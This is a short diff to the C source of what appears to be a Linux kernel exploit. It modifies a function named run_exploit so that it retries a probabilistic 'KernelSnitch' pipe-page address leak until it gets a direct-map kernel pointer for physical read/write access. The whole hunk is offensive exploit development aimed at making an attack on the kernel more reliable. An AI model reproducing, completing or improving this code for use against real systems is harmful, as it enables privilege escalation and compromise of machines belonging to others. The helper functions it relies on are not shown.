@@ -485,8 +485,23 @@ int run_exploit(int argc, char **argv) {
   pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
 #else
 #if !defined(APP_FOPS_BEFORE_PIPE) || !APP_FOPS_BEFORE_PIPE
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  /* The pipe-page KernelSnitch leak is independent and probabilistic. */
+#ifdef APP_PIPE_PAGE_SETUP_ATTEMPTS
+  const int pipe_page_setup_attempts = APP_PIPE_PAGE_SETUP_ATTEMPTS;
+#else
+  const int pipe_page_setup_attempts = 1;
+#endif
+  for (int attempt = 1; attempt <= pipe_page_setup_attempts; attempt++) {
+    if (attempt != 1) {
+      reset_pipe_attempt();
+    }
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx attempt=%d/%d\n",
+            pipebuf_page_base, attempt, pipe_page_setup_attempts);
+    if (is_direct_ptr(pipebuf_page_base)) {
+      break;
+    }
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
     return 1;
   }
